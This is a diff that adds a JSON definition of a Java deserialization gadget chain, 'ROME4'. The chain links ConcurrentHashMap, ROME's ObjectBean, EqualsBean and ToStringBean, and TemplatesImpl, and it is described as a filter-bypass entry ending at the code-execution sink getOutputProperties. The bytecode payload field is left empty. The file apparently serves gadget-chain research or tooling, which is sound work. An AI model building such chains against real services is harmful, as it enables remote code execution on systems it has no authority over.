@@ -1,0 +1,38 @@
+{
+    "chain_type": "ROME4 — ConcurrentHashMap + ObjectBean/ToStringBean → TemplatesImpl (filter-bypass entry)",
+    "root_class": "java.util.concurrent.ConcurrentHashMap",
+    "root_trigger": "readObject→putVal→ObjectBean.hashCode→EqualsBean.beanHashCode→ToStringBean.toString",
+    "links": [
+        {
+            "class": "com.sun.syndication.feed.impl.ObjectBean",
+            "field_overrides": {
+                "_equalsBean": {"$ref": "link:1"},
+                "_toStringBean": {"$ref": "link:2"},
+                "_cloneableBean": null
+            }
+        },
+        {
+            "class": "com.sun.syndication.feed.impl.EqualsBean",
+            "field_overrides": {
+                "_beanClass": "com.sun.syndication.feed.impl.ToStringBean",
+                "_obj": {"$ref": "link:2"}
+            }
+        },
+        {
+            "class": "com.sun.syndication.feed.impl.ToStringBean",
+            "field_overrides": {
+                "_beanClass": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+                "_obj": {"$ref": "link:3"}
+            }
+        },
+        {
+            "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+            "field_overrides": {
+                "_name": "exploit",
+                "_class": null,
+                "_bytecodes": null
+            }
+        }
+    ],
+    "sink_method": "TemplatesImpl.getOutputProperties"
+}
